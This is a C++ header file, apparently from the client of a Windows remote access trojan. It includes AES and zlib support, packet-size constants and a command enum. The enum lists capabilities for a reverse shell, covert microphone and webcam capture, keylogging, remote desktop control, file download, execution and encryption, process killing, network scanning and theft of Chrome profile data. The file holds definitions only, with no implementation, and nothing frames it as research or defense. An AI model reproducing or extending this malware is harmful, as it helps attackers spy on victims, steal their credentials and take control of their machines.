#ifndef ___HEADERS
#define ___HEADERS 1

#include<ws2tcpip.h>
#include<windows.h>
#include<iostream>
#include<mutex>
#include<iomanip>
#include<atomic>
#include<memory>
#include<map>
#include<thread>
#include<random>
#include<functional>
#include<fstream>
#include<sstream>
#include<string>
#include<vector>
#include<queue>
#include<cstring>
#include<ctime>
#include<psapi.h>
#include<sys/stat.h>
#include<wtsapi32.h>
#include<winbase.h>
#include<winnt.h>
#include<fcntl.h>
#include<lmcons.h>
#include<intrin.h>
#include<shlobj.h>
#include<shlwapi.h>
#include<gdiplus.h>

#include "../aes256/aes256.hpp"
#include "../zlib/zlib.h"

#define AES_KEY_LEN 32
#define ___DBG__
#define MAX_CAMS 5
#define CMD_DEL '~'
#define CMD_DEL_2 ":[<->]:"
#define PAQUETE_BUFFER_SIZE 1024 * 5
#define CHUNK_FILE_TRANSFER_SIZE 1024 * 10
#define DUMMY_PARAM "0"
#define PAQUETE_MINIMUM_SIZE sizeof(unsigned int) * 3
#define MAX_PAQUETE_SIZE 50000


#ifdef ___DBG__
    #define error() std::cout<<"Error["<<GetLastError()<<"]\n";
    #define error_2(x) std::cout<<"["<<x<<"]"<<"Error["<<GetLastError()<<"]\n";
    #define _DBG_(a, b) std::cout<<"[DBG] "<<a<<" "<<b<<"\n";
    #define __DBG_(a) std::cout<<"[DBG] "<<a<<"\n";
#else
    #define error() NULL
    #define error_2(x) NULL
    #define _DBG_(a, b) NULL
    #define __DBG_(a) NULL
#endif

typedef unsigned int u_int;
typedef const char c_char;
typedef unsigned long long int u64;

namespace EnumComandos {
    enum Enum {
        CLI_RESTART = 496,
        CLI_STOP,
        CLI_KSWITCH,
        INIT_PACKET,
        PONG,
        PING,
        Reverse_Shell_Start,
        Reverse_Shell_Command,
        Reverse_Shell_Salida,
        Reverse_Shell_Finish,
        Mic_Refre_Dispositivos,
        Mic_Refre_Resultado,
        Mic_Iniciar_Escucha,
        Mic_Detener_Escucha,
        Mic_Live_Packet,
        Mic_Stop,
        FM_Discos,
        FM_Discos_Lista,
        FM_Dir_Folder,
        FM_CPATH,
        FM_Crear_Folder,
        FM_Crear_Archivo,
        FM_Borrar_Archivo,
        FM_Descargar_Archivo,
        FM_Descargar_Archivo_Recibir,
        FM_Descargar_Archivo_Init,
        FM_Descargar_Archivo_End,
        FM_Ejecutar_Archivo,
        FM_Editar_Archivo,
        FM_Editar_Archivo_Paquete,
        FM_Editar_Archivo_Guardar_Remoto,
        FM_Renombrar_Archivo,
        FM_Crypt_Archivo,
        FM_Crypt_Confirm,
        PM_Refrescar,
        PM_Kill,
        PM_Lista,
        KL_Iniciar,
        KL_Detener,
        KL_Salida,
        CM_Lista,
        CM_Lista_Salida,
        CM_Single,
        CM_Single_Salida,
        CM_Live_Start,
        CM_Live_Stop,
        RD_Lista,
        RD_Lista_Salida,
        RD_Single,
        RD_Start,
        RD_Stop,
        RD_Salida,
        RD_Salida_Pixel,
        RD_Update_Q,
        RD_Update_Vmouse,
        RD_Send_Click,
        RD_Send_Teclado,
        WM_Lista,
        WM_CMD,
        INF_Chrome_Profiles,
        INF_Chrome_Profile_Data,
        INF_Chrome_Profiles_Out,
        INF_Chrome_Profile_Data_Out,
        INF_Users,
        INF_Error,
        PROXY_CMD,
        Net_Scan,
        Net_Scan_Syn,
        Net_Scan_Sck,
        Net_Scan_Full_Syn,
        Net_Scan_Full_Sck,
        Fun_Block_Input,
        Fun_Swap_Mouse,
        Fun_Msg,
        Fun_CD
    };
}

 
#endif

